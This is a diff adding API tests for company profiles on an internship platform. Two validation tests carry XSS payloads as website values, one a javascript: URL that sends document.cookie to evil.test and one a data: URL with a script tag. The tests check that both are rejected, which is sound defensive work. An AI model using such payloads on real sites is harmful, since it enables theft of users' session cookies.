@@ -2,7 +2,7 @@ const { test, describe, after } = require('node:test');
 const assert = require('node:assert/strict');
 const request = require('supertest');
 const app = require('../src/app');
-const { sequelize, Usuario, Estudiante, Empresa } = require('../src/models');
+const { sequelize, Usuario, Estudiante, Empresa, Oferta } = require('../src/models');
 const tokensService = require('../src/services/auth/tokens');
 const passwords = require('../src/services/auth/passwords');
 const { normalizarRut } = require('../src/utils/rut');
@@ -168,6 +168,28 @@ describe('POST /empresas/perfil y validación', () => {
     assert.equal(segunda.status, 409);
   });
 
+  test('un sitioWeb con esquema javascript: se rechaza con 422 (auditoría de Fase 6)', async () => {
+    const { accessToken } = await crearUsuarioActivo('empresa');
+    const respuesta = await request(app)
+      .post('/api/v1/empresas/perfil')
+      .set('Authorization', `Bearer ${accessToken}`)
+      .send(datosEmpresa({ sitioWeb: "javascript:fetch('https://evil.test/r?c='+document.cookie)" }));
+
+    assert.equal(respuesta.status, 422);
+  });
+
+  test('un sitioWeb sin http/https se rechaza también al editar', async () => {
+    const empresa = await crearUsuarioActivo('empresa');
+    await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());
+
+    const edicion = await request(app)
+      .patch('/api/v1/empresas/perfil')
+      .set('Authorization', `Bearer ${empresa.accessToken}`)
+      .send({ sitioWeb: 'data:text/html,<script>alert(1)</script>' });
+
+    assert.equal(edicion.status, 422);
+  });
+
   test('coordinación valida una empresa pendiente', async () => {
     const empresa = await crearUsuarioActivo('empresa');
     const coordinacion = await crearUsuarioActivo('coordinacion');
@@ -298,6 +320,37 @@ describe('POST /empresas/perfil y validación', () => {
     assert.equal(edicionDeContacto.body.estadoValidacion, 'validada');
   });
 
+  test('cambiar la razón social cierra en cascada las ofertas publicadas, no solo revierte el estado de la empresa (auditoría de Fase 6)', async () => {
+    const empresa = await crearUsuarioActivo('empresa');
+    const coordinacion = await crearUsuarioActivo('coordinacion');
+    const creada = await request(app).post('/api/v1/empresas/perfil').set('Authorization', `Bearer ${empresa.accessToken}`).send(datosEmpresa());
+    await request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);
+
+    const oferta = await request(app)
+      .post('/api/v1/ofertas')
+      .set('Authorization', `Bearer ${empresa.accessToken}`)
+      .send({
+        titulo: 'Práctica', descripcion: 'd', requisitos: 'r', area: 'x', modalidad: 'remota', jornada: 'completa', remunerada: false,
+        fechaCierre: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
+      });
+    await request(app).post(`/api/v1/ofertas/${oferta.body.id}/revision`).set('Authorization', `Bearer ${empresa.accessToken}`);
+    await request(app).post(`/api/v1/ofertas/${oferta.body.id}/aprobacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);
+
+    const edicion = await request(app)
+      .patch('/api/v1/empresas/perfil')
+      .set('Authorization', `Bearer ${empresa.accessToken}`)
+      .send({ razonSocial: 'Nueva Identidad Sin Revisar' });
+    assert.equal(edicion.body.estadoValidacion, 'pendiente');
+
+    // La vitrina pública nunca debe mostrar la razón social nueva sin revisar, pegada a una oferta
+    // que sigue vigente: la oferta ya no puede seguir "publicada".
+    const ofertaTrasEdicion = await Oferta.findByPk(oferta.body.id);
+    assert.notEqual(ofertaTrasEdicion.estado, 'publicada');
+
+    const listado = await request(app).get('/api/v1/ofertas');
+    assert.ok(!listado.body.ofertas.some((o) => o.id === oferta.body.id));
+  });
+
   test('coordinación puede suspender una empresa validada, con motivo obligatorio', async () => {
     const empresa = await crearUsuarioActivo('empresa');
     const coordinacion = await crearUsuarioActivo('coordinacion');
@@ -344,6 +397,44 @@ describe('acceso cruzado entre empresas', () => {
 
     const perfilDeB = await Empresa.findOne({ where: { usuarioId: b.usuario.id } });
     assert.equal(perfilDeB.razonSocial, 'Empresa-B');
+  });
+});
+
+describe('GET /empresas/:id (perfil público)', () => {
+  test('una empresa validada responde con la lista blanca de campos públicos', async () => {
+    const empresa = await crearUsuarioActivo('empresa');
+    const coordinacion = await crearUsuarioActivo('coordinacion');
+    const creada = await request(app)
+      .post('/api/v1/empresas/perfil')
+      .set('Authorization', `Bearer ${empresa.accessToken}`)
+      .send(datosEmpresa({ razonSocial: 'Empresa Pública SpA' }));
+    await request(app).post(`/api/v1/empresas/${creada.body.id}/validacion`).set('Authorization', `Bearer ${coordinacion.accessToken}`);
+
+    const respuesta = await request(app).get(`/api/v1/empresas/${creada.body.id}`);
+    assert.equal(respuesta.status, 200);
+    assert.equal(respuesta.body.razonSocial, 'Empresa Pública SpA');
+    assert.deepEqual(Object.keys(respuesta.body).sort(), ['comuna', 'giro', 'id', 'razonSocial', 'sitioWeb']);
+  });
+
+  test('una empresa pendiente, rechazada o suspendida responde 404, igual que si no existiera', async () => {
+    for (const estadoValidacion of ['pendiente', 'rechazada', 'suspendida']) {
+      const usuario = await crearUsuarioActivo('empresa');
+      const perfil = await Empresa.create({
+        usuarioId: usuario.usuario.id,
+        razonSocial: 'Empresa no pública',
+        rutEmpresa: generarRutValido().replace(/[.\-]/g, ''),
+        contactoNombre: 'x',
+        contactoCargo: 'x',
+        estadoValidacion,
+      });
+      const respuesta = await request(app).get(`/api/v1/empresas/${perfil.id}`);
+      assert.equal(respuesta.status, 404, `estadoValidacion=${estadoValidacion}`);
+    }
+  });
+
+  test('un id que no existe responde 404', async () => {
+    const respuesta = await request(app).get('/api/v1/empresas/9999999');
+    assert.equal(respuesta.status, 404);
   });
 });
 
